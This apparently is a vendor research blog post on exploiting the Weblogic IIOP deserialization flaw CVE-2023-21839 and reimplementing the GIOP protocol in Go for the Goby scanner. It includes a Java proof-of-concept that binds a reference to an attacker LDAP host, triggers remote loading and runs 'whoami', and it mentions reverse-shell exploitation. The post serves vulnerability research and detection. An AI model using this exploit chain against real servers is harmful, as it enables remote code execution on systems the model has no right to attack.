# The Art of Cross-Languages: Weblogic Serialization Vulnerability and IIOP Protocol
# 0x01 Explore Summarize

The Weblogic serialization vulnerability mainly depends on the T3 and IIOP protocols, which have many issues in communication interaction, such as cross-language and network transmission, which can bring many inconveniences to vulnerability detection and exploitation. In the philosophy of WhiteHat Labs, vulnerability detection and exploitation is a creative work that should be implemented in the most concise and efficient way to ensure cross-platform and practicality of the vulnerability. Therefore, we have implemented a cross-language IIOP protocol communication solution to solve the serialization vulnerability problem.

In the CVE-2023-21839 vulnerability in Goby, we successfully implemented a solution for cross-language communication of the IIOP protocol and achieved perfect results in vulnerability detection and exploitation.

![](https://s3.bmp.ovh/imgs/2023/04/17/935fb2d9be4116c4.gif)

 

# 0x02 Weblogic IIOP

GIOP is a protocol defined by the CORBA specification, which is used for communication and interaction between distributed objects. It defines basic communication patterns and protocol specifications for object requests, responses, exceptions, naming, etc. In simple terms, GIOP is an abstract protocol standard that defines communication patterns and protocol specifications, and is not a specific protocol implementation.

IIOP is a TCP/IP protocol stack that implements the GIOP protocol, allowing CORBA objects to communicate and interact over the Internet. In simple terms, the IIOP protocol is a GIOP protocol implemented on the TCP/IP layer.

RMI-IIOP is a way of implementing the Java remote method invocation (RMI) protocol, which extends the IIOP protocol with the functionality of remote calling Java objects through RMI. In simple terms, the RMI-IIOP protocol combines the functionality of RMI remote calling Java objects with the IIOP protocol. (In the Weblogic section of this article, RMI-IIOP will be treated as the IIOP protocol.)

In the article "Weblogic IIOP Protocol NAT Network Bypass" (https://www.r4v3zn.com/posts/144eb4b6/#more), it is mentioned that "T3 protocol is essentially the protocol used for data transmission in RMI. RMI-IIOP is compatible with both RMI and IIOP. Therefore, in Weblogic, any code that can be serialized through T3 can also be serialized through IIOP protocol." For Weblogic that has enabled both IIOP and T3 protocols, there is no essential difference in the process of serializing data protocol transmission, and there may be network problems in the communication process of Weblogic. Therefore, to solve the problem of Java serialization and IIOP network issues, I chose the IIOP protocol as the focus of this Weblogic serialization protocol research.

# 0x03 IIOP attack process

![](https://s3.bmp.ovh/imgs/2023/04/17/69e301c7dcd91576.png) 

Taking the CVE-2023-21839 Weblogic serialization vulnerability as an example, in the IIOP attack process of Weblogic, the attacker first initializes the context information, uses the rebind() method to bind the malicious object to the registry, and then triggers the vulnerability by using the lookup() method to remotely load the stub object from the malicious address. During the loading process, the customized malicious object performs a self-binding operation, binds an object with echo to the Weblogic registry, and then remotely calls the method in that object to achieve the purpose of attack echo.

PoC ：

```java
public class main {
    public static void main(String[] args) throws NamingException, RemoteException {
        ForeignOpaqueReference foreignOpaqueReference = new ForeignOpaqueReference("ldap://xxx.xxx.xxx.xxx:1389/exp", null);
        String iiop_addr = "iiop://10.211.55.4:7001";
        Hashtable<String, String> env = new Hashtable<String, String>();
        env.put("java.naming.factory.initial", "weblogic.jndi.WLInitialContextFactory");
        env.put("java.naming.provider.url", iiop_addr);
        Context context = new InitialContext(env);    // Initialize context and establish interactive connections  LocateRequest LocateReply
        String bind_name = String.valueOf(System.currentTimeMillis());
        context.rebind(bind_name, foreignOpaqueReference);  //Bind remote objects rebind_any
        context.lookup(bind_name);  // Get Remote Objects resove_anyClusterMasterRemote
        clusterMasterRemote = (ClusterMasterRemote)context.lookup("selfbind_name"); //Obtain self bound echo objects
        System.out.println(clusterMasterRemote.getServerLocation("whoami"));  // Executing methods in remote objects
    }
}
```



## 3.1 Attack process in Java

![](https://s3.bmp.ovh/imgs/2023/04/17/3e70897bf1720266.png)

1. At the beginning of IIOP serialization interaction in Weblogic, the client initializes the context information with new `InitialContext()` and uses the `locateNameService()` method to encapsulate the target address, serialized object, and other information into the IIOP protocol request packet as a `LocateRequest` message to establish communication with the Weblogic server.

![](https://s3.bmp.ovh/imgs/2023/04/17/17a490d1c1d534d1.png)

2. When the client receives a `LocateReply` message from the server, it indicates that the communication interaction has been established. The client will parse the information in the response message body and extract relevant information (such as Key Address, internal class addresses, context information, etc.) to be used as verification information for the next request message.

![](https://s3.bmp.ovh/imgs/2023/04/17/e60cc7ce2f94caf9.png)

3. After the communication is established, IIOP will use the `Key Address` in the server response packet during the interaction establishment as the `Key Address` in the next request. When the `bind()` or `rebind()` method is executed, the binding object name, object's serialized data, and other information will be encapsulated into the `Stub data` field of the request message body for message transmission.

![](https://s3.bmp.ovh/imgs/2023/04/17/ee690e2507f44f8b.png)

![](https://s3.bmp.ovh/imgs/2023/04/17/89be24f41b220723.png)

4. When the IIOP protocol executes the `lookup()` method, it first calls the `lookup()` method in the created context object. The `lookup()` method decides which `lookup()` method to call based on whether the context is of type `NamingContextAny`. As the context object belongs to the NamingContextAny type, the string var1 is converted to a `WNameComponent (Wide Name Component)` array using the `Utils.stringToWNameComponent(var1)` method and passed to the `this.lookup()` method. Finally, the message is encapsulated into a serialized byte stream and sent to the server by calling the `resolve_any()` method.



# 0x04 Cross-language implementation of IIOP

In the "**IIOP Attack Process**" chapter, in the interaction section, when Weblogic is in an intranet environment, the client will use the internal network address of the Weblogic internal class returned in the LocateReply as the target address for the next packet. This can cause the client to send packets to its own internal address, leading to network communication interruption problems. Additionally, since there is no official IIOP protocol library available in Go, it is difficult to implement vulnerability attacks on the Goby security tool. If we were to add a Java program as a plug-in, it would make Goby more bloated, which does not align with the vulnerability values of White Hat Academy Security Research Institute. To address these issues, we decided to directly replicate the IIOP protocol as the ultimate solution.

## 4.1 Realization idea

**The essence of protocol communication is the transmission of data in the form of byte streams over the network. Therefore, the way Go implements the IIOP protocol is to simulate the byte streams of IIOP communication.**
For the attack process described in the previous section, we divided the IIOP protocol communication during the attack into four parts: establishing interaction, binding remote objects, obtaining remote objects, and executing object methods. In Java, these are mainly accomplished through the following methods:

```java
Context context = new InitialContext(env);    // Initialize up and down connections, establish interactive connections LocateRequest message LocateReply function
context.rebind(bind_name, foreignOpaqueReference);  // bind remote object Request message rebind_any function
context.lookup(bind_name);  // get remote object Request message lookup function
ClusterMasterRemote clusterMasterRemote = (ClusterMasterRemote)context.lookup("selfbind_name"); //Obtain self bound echo objects 
clusterMasterRemote.getServerLocation("whoami");  // Executing methods in remote objects
```

When simulating the IIOP protocol implementation, we only need to implement the byte streams of protocol interaction during the execution process for the above-mentioned methods.

 

## 4.2 GIOP protocol specification

GIOP (General Inter-ORB Protocol) is a protocol defined by the CORBA specification, used for communication and interaction between distributed objects. It defines basic communication patterns and protocol specifications for object requests, responses, exceptions, naming, and so on.

![](https://s3.bmp.ovh/imgs/2023/04/17/37b0ed040563c1f9.jpeg)

GIOP messages consist of two parts: message header and message body.

The GIOP message header includes four fields: Magic (GIOP identification), Version (GIOP version), Message Flags (flags), Message type (message type), and Message size (message body length).

In the GIOP message body, it mainly includes fields such as Request id (request identification), TargetAddress (target object key ID), Key Address (key address), Request operation (operation method), ServiceContext (service context information).

Due to space limitations, we will not elaborate on the meanings of the GIOP fields here. If you want to delve deeper into the protocol content, please refer to our manual "GIOP Protocol Analysis" that we have summarized. (https://github.com/FeatherStark/GIOP-Protocol-Analysis)。

 

### 4.2.1 GIOP protocol communication process

* In the initial stage of communication, the client first sends a message of type `LocateRequest` to the server to establish communication. The server verifies the request information and responds with a message of type `LocateReply` to indicate that it has received the client's request and begins to interact with the client.

* After the communication is established, the client sends a message of type `Request` to execute a method in the server. The request body of the `Request` message contains key address (`Key Address`), the name of the method to be executed (`Request operation`), message context (`Service Context`), and information for calling remote objects (`Stub data`), etc.

* After receiving and parsing the request message correctly, the server responds with a `No Exception` message of type Reply. If the request message is parsed incorrectly or there is an exception on the server side, the server responds with a `User Exception`/`System Exception` message of type Reply, and the response body includes the exception ID (`Exception id`) information.

 

## 4.3 initialize context

```java
Context context = new InitialContext(env); *// Initialize up and down connections, establish interactive connections LocateRequest message LocateReply function*
```

 

In Java code, initializing context information establishes the IIOP protocol interaction process during object creation. Therefore, in Go language, implementing the byte stream generated by `new InitialContext(env)` and sending it to Weblogic is sufficient. The process of creating the `new InitialContext(env)` object in the IIOP protocol implementation is represented by the `LocateRequest` message.

![](https://s3.bmp.ovh/imgs/2023/04/17/9f1fd2078b78e355.png)

The `LocateRequest` message sent by the client has a fixed format, which includes information such as GIOP protocol identification, protocol version, message type, and message identification.

![](https://s3.bmp.ovh/imgs/2023/04/17/c2e48191d34bc9c7.png)

As the `LocateRequest` is a fixed-format sequence, it can be directly sent to the server to establish an interactive connection.

![](https://s3.bmp.ovh/imgs/2023/04/17/afaaca9dd6f6c6cd.png)

After the server receives and verifies the `LocateRequest` message correctly, it responds to the client with a `LocateReply` message. The `LocateReply` message contains information about the server's context, key address, length, and other details.

![](https://s3.bmp.ovh/imgs/2023/04/17/bf31fcfaf30bee51.png)

After the interaction is established, the key address in the response body will be used in the next communication process, so it needs to be extracted and stored for future use. To do this, we need to extract the length of the `Key Address length` first, then calculate the `Key Address` based on the length of the Key, and store it for use in the next request. Additionally, since the target address of the next request packet is under our control, it fundamentally avoids the NET network issues that occurred before. By doing this, communication has been successfully established.

![](https://s3.bmp.ovh/imgs/2023/04/17/b9313e6cf56b792a.png)

After the communication is established, in order to verify the validity of the `Key Address` returned by the server, we send a `Request` message with a method name `_non_existent` to the server. If the server responds with a `No Exception` status, it indicates that the `Key Address` is valid.

## 4.4 binding remote objects

```java
context.rebind(bind_name, foreignOpaqueReference); *// bind remote objests Request message rebind_any function* 
```

In the Java language, the `rebind()` method can be used to bind an object to the Weblogic registry. In Go language, we can implement the byte stream of the `context.rebind()` method, add the name and serialized object to be bound to the byte stream, and then send it to Weblogic.

In the specific implementation of the IIOP protocol, the operation method name for `rebind()` method is `rebind_any`.

![](https://s3.bmp.ovh/imgs/2023/04/17/2647e81bef8bab0b.png)

By using the `rebind_any` method, the binding name and serialized object data in the `Stub data` are sent to the server, and the server performs a rebinding operation to bind the object to the Weblogic Register.

![](https://s3.bmp.ovh/imgs/2023/04/17/a54af89fef331f71.png)

The core of simulating the `rebind_any` method in Go is to add the generated payload byte stream to the Stub data section at the end of the request body.



## 4.5 obtaining remote objects

```java
context.lookup(bind_name); *// bind remote object Request message lookup function*
```

In Java code, the `lookup()` method of the context object can be used to obtain the stub object of the binding name in Weblogic. Similarly, in Go language, we can implement the byte stream of the `context.lookup()` method, add the name to be bound to the byte stream, and then send it to Weblogic.

In the specific implementation of the IIOP protocol, the operation method name for the `lookup() `method is `resolve_any`.![](https://s3.bmp.ovh/imgs/2023/04/17/eead63a43c94013f.png)

The `resolve_any` method obtains the stub object on the registration center by sending registration naming information. The Go bytecode implementation here is similar to the previous one, which puts the information in the `Stub data` and sends it to the server, but the naming information of the stub is stored here.

![](https://s3.bmp.ovh/imgs/2023/04/17/ca56f1cbc12062b7.png)

The response message of `resolve_any` will generate a new `Key Address`, which contains the reference address and other information for obtaining the remote object. When executing the methods in this object, the Key Address in the new request message needs to be replaced with this information. This way, the methods in the object can be executed normally.



## 4.6 execute object method

After executing the lookup() method, we obtain the stub information of the remote object, and then we can call the methods in the object to achieve the purpose of remote method invocation. The code clusterMasterRemote.getServerLocation("whoami") is an example of calling a method in the remote object.

![](https://s3.bmp.ovh/imgs/2023/04/17/29cef95361a9f5fc.png)

The above content describes the process of binding an echo class on the CVE-2023-21839 vulnerability and implementing the byte stream using the Go language. We need to implement the byte stream in the format of GIOP byte stream, set the value of the Request operation field to the name of the method we want to execute, set the Operation length to the length of the method name, and set the Stub data to the byte stream of the executed method. Finally, encapsulate it into a GIOP byte stream and send it to Weblogic. This method can trigger the vulnerability and obtain the echo effect, as shown in the figure below.

![](https://s3.bmp.ovh/imgs/2023/04/17/028cc50f0617e4e8.gif)



# 0x05 Summary

At WhiteCapSec Security Research Institute, vulnerability detection and exploitation are creative work, and we are committed to achieving the most concise and efficient implementation. In order to achieve the best effect and utilization of Weblogic serialization vulnerability in Goby, we spent a lot of effort reading IIOP serialization source code, analyzing protocol traffic, and debugging fields and bytecode in the protocol. Finally, we successfully implemented an IIOP protocol vulnerability exploitation framework in Go language. To verify the reliability of the framework, we took the Weblogic deserialization vulnerability (CVE-2023-21839) as an example and achieved perfect vulnerability exploitation effect in Goby, as well as added one-click echo and one-click rebound shell exploitation methods.

The vulnerabilities and features demonstrated in this article will be launched on Goby on April 18 (next Tuesday). Please pay attention to the Goby version update notification or WeChat community announcement at that time. 

Goby Community Edition can be downloaded and experienced for free at https://gobysec.org.


Author: 14m3ta7k

If you have a functional type of issue, you can raise an issue on GitHub or in the discussion group below:

1. GitHub issue: https://github.com/gobysec/Goby/issues
2. Telegram Group: http://t.me/gobies (Group benefits: enjoy the version update 1 month in advance) 
3. Telegram Channel: https://t.me/joinchat/ENkApMqOonRhZjFl (Channel benefits: enjoy the version update 1 month in advance) 
4. WeChat Group: First add my personal WeChat: **gobyteam**, I will add everyone to the official WeChat group of Goby. (Group benefits: enjoy the version update 1 month in advance) 


 

